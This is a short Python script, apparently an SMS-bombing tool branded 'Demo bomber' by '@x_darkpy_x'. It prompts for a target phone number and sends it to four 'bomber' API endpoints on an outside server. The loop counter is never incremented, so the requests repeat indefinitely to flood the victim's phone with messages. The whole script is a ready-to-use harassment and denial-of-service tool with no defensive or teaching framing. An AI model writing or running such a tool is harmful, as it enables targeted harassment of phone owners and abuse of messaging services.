import requests
import time
from colorama import Fore
import sys
import os
from subprocess import Popen
def baner():
 if os.name == "nt":
  os.system("cls")
  print("")
  Popen('neofetch -c red -ac green')
  time.sleep(2)
 elif os.name == "posix":
  os.system("clear")
  print("")
  Popen('neofetch')
  time.sleep(2)
baner()
print(Fore.RED+"""
#=========================== #
# Coded by : >> @x_darkpy_x  #
#=========================== #
""")
time.sleep(1)
print(Fore.BLUE+"[!]"+Fore.GREEN+" Welcome to the "+Fore.YELLOW+"Demo bomber"+Fore.RED+" :)\n")
time.sleep(0.5)
print(Fore.CYAN+"[!]"+Fore.BLUE+" Please send the target number.\n"+Fore.MAGENTA+"\n[!] "+Fore.CYAN+"Send like this"+Fore.WHITE+"  <"+Fore.RED+" 09100000000 "+Fore.WHITE+">  ")
time.sleep(0.5)
#get number phone
phone = input(Fore.RED+"\n[!]"+Fore.MAGENTA+" Enter : "+Fore.RED+" >>  ")
if phone == "":
	print(Fore.RED+"[!]"+Fore.BLUE+" please Enter phone number :) ")
	time.sleep(1)
	sys.exit()
#api bomber
sms = 1
api1 = "http://dark.pouyanserver.ir/api/bomber1.php?id={num}&count=30".format(num=phone)
api2 = "http://dark.pouyanserver.ir/api/bomber3.php?number={add}{num}&count=30".format(add=0,num=phone)
api3 = "http://dark.pouyanserver.ir/api/bomber4.php?number={add}{num}".format(add=98,num=phone)
api4 = "http://dark.pouyanserver.ir/api/bomber5.php?phone={num}&count=10".format(num=phone)
time.sleep(0.1)
while sms < 5:
	#time.sleep(0.1)
    requests.get(api1)
    #time.sleep(0.1)
    requests.get(api2)
    #time.sleep(0.1)
    requests.get(api3)
    #time.sleep(0.1)
    requests.get(api4)
